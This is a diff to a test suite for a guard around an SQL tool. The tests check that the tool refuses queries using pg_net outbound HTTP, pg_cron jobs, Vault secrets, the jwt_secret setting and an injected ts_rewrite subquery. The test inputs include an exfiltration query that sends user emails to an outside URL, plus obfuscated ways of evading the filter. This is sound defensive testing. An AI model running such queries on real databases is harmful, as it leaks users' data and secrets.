@@ -18,6 +18,7 @@ import {
   shapeSqlResult,
   SQL_TABLE_DISPLAY_ROWS,
   sqlIdentifiers,
+  sqlNames,
   timeKinds,
   wrapSql,
 } from "./run-sql"
@@ -82,8 +83,12 @@ describe("prepareSql", () => {
       ["SELECT database_to_xmlschema(true, false, '')", "database_to_xmlschema"],
       ["SELECT cursor_to_xml('c', 1, true, false, '')", "cursor_to_xml"],
       ["SELECT * FROM ts_stat('select 1')", "ts_stat"],
-      // ts_rewrite's second argument is a query too: it could read anything named only inside a string
-      ["SELECT ts_rewrite('a'::tsquery, 'SELECT ''a''::tsquery, quote_literal(content)::tsquery FROM some_table')::text AS t", "ts_rewrite"],
+      // ts_rewrite runs the SELECT in its second argument, past every name check
+      [
+        "SELECT ts_rewrite('a'::tsquery, 'SELECT ''a''::tsquery, quote_literal(left(content,200))::tsquery FROM net._http_response')::text",
+        "ts_rewrite",
+      ],
+      ['SELECT "TS_REWRITE"(\'a\'::tsquery, \'select 1\')', "ts_rewrite"],
       ["SELECT lo_get(1)", "lo_get"],
       ["SELECT loread(1, 10)", "loread"],
       ["SELECT * FROM dblink_exec('x')", "dblink_exec"],
@@ -119,8 +124,86 @@ describe("prepareSql", () => {
       if (!result.ok) {
         expect(result.error, sql).toContain("off-limits")
         expect(result.error, sql).toContain(name)
+        // The rename hint is only for an alias named like one of the schemas
+        expect(result.error, sql).not.toContain("rename it")
       }
     }
+  })
+
+  it("turns away the pg_net, pg_cron, Vault and scheduler schemas, and pg_net's names anywhere", () => {
+    const blocked: [string, string][] = [
+      // pg_net: outbound HTTP, its queue and its stored responses (readable by every role)
+      ["SELECT net.http_get('https://example.com') AS id", "net"],
+      ["SELECT net.http_post('https://example.com', '{}'::jsonb) AS id", "net"],
+      ["SELECT net.http_delete('https://example.com') AS id", "net"],
+      ['SELECT "net"."http_get"(\'https://example.com\') AS id', "net"],
+      ["SELECT NET . HTTP_GET('https://example.com') AS id", "net"],
+      ["SELECT net/* gap */.http_get('https://example.com') AS id", "net"],
+      ["SELECT net -- gap\n.http_get('https://example.com') AS id", "net"],
+      ["SELECT http_get('https://example.com') AS id", "http_get"],
+      ["SELECT http_post('https://example.com', '{}'::jsonb) AS id", "http_post"],
+      ["SELECT http_delete('https://example.com') AS id", "http_delete"],
+      ["SELECT * FROM net.http_request_queue", "net"],
+      ["SELECT count(*) FROM http_request_queue", "http_request_queue"],
+      ["SELECT content FROM net._http_response", "net"],
+      ['SELECT content FROM "_http_response"', "_http_response"],
+      // pg_cron's jobs and run log
+      ["SELECT command FROM cron.job", "cron"],
+      ["SELECT * FROM cron.job_run_details", "cron"],
+      ['SELECT * FROM "cron"."job"', "cron"],
+      ['SELECT * FROM "Event" e WHERE EXISTS (SELECT 1 FROM CRON.JOB)', "cron"],
+      // Vault's secrets
+      ["SELECT decrypted_secret FROM vault.decrypted_secrets", "vault"],
+      ['SELECT * FROM "vault"."secrets"', "vault"],
+      // Our scheduler schema
+      ["SELECT scheduler.tick()", "scheduler"],
+      ['SELECT * FROM "scheduler"."tick"()', "scheduler"],
+    ]
+    for (const [sql, name] of blocked) {
+      expect(findOffLimits(sql), sql).toBe(name)
+      const result = prepareSql(sql)
+      expect(result.ok, sql).toBe(false)
+      if (!result.ok) {
+        expect(result.error, sql).toContain("off-limits")
+        expect(result.error, sql).toContain(name)
+      }
+    }
+  })
+
+  it("allows aliases named like those schemas until one qualifies a column, then says to rename it", () => {
+    for (const sql of [
+      'SELECT sum("amountCents") AS net FROM "Payment"',
+      'SELECT sum("amountCents") AS "Net" FROM "Payment"',
+      'SELECT count(*) AS cron, 1 AS vault FROM "ScheduledJob" scheduler',
+      'SELECT net FROM (SELECT sum("amountCents") AS net FROM "Payment") t',
+    ]) {
+      expect(prepareSql(sql).ok, sql).toBe(true)
+    }
+    const qualified = prepareSql('SELECT scheduler."key" FROM "ScheduledJob" scheduler')
+    expect(qualified.ok).toBe(false)
+    if (!qualified.ok) expect(qualified.error).toContain("If scheduler is a table alias you chose, rename it.")
+    // pg_net's own names stay refused anywhere, alias or not
+    expect(prepareSql('SELECT 1 AS http_get FROM "Event"').ok).toBe(false)
+    expect(prepareSql('SELECT 1 AS "_http_response"').ok).toBe(false)
+    expect(sqlNames('SELECT "net" /* c */ . x, net FROM t -- d\r.y')).toEqual([
+      { name: "select", qualifies: false },
+      { name: "net", qualifies: true },
+      { name: "x", qualifies: false },
+      { name: "net", qualifies: false },
+      { name: "from", qualifies: false },
+      { name: "t", qualifies: true },
+      { name: "y", qualifies: false },
+    ])
+  })
+
+  it("doesn't mistake the club's scheduler tables, longer names or strings for those schemas", () => {
+    const fine = [
+      'SELECT "ScheduledJob"."key", "SchedulerHeartbeat"."lastTickAt" FROM "ScheduledJob", "SchedulerHeartbeat"',
+      "SELECT 1 AS network, 2 AS cronies, 3 AS vaults, 4 AS netcents, 5 AS http_status",
+      "SELECT 'net.http_get' AS s, 'cron.job' AS t -- vault.decrypted_secrets\n",
+      "SELECT $$scheduler.tick()$$ AS s /* net._http_response */",
+    ]
+    for (const sql of fine) expect(prepareSql(sql).ok, sql).toBe(true)
   })
 
   it("doesn't mistake strings, comments, aliases or the club's own names for off-limits ones", () => {
@@ -390,6 +473,13 @@ describe("run_sql", () => {
     const result = await runSqlTool.run({ sql: "SELECT current_setting('app.settings.jwt_secret') AS s" }, ctx)
     expect(result).toMatchObject({ isError: true, label: "Query not run" })
     expect(result.forModel).toMatch(/^Catalog and settings access is off-limits/)
+    expect(sql.executed).toEqual([])
+  })
+
+  it("refuses an outbound web request through pg_net before it reaches the database", async () => {
+    const result = await runSqlTool.run({ sql: `SELECT net.http_get('https://example.com/?d=' || string_agg(email, ',')) AS id FROM "User"` }, ctx)
+    expect(result).toMatchObject({ isError: true, label: "Query not run" })
+    expect(result.forModel).toContain("net")
     expect(sql.executed).toEqual([])
   })
 
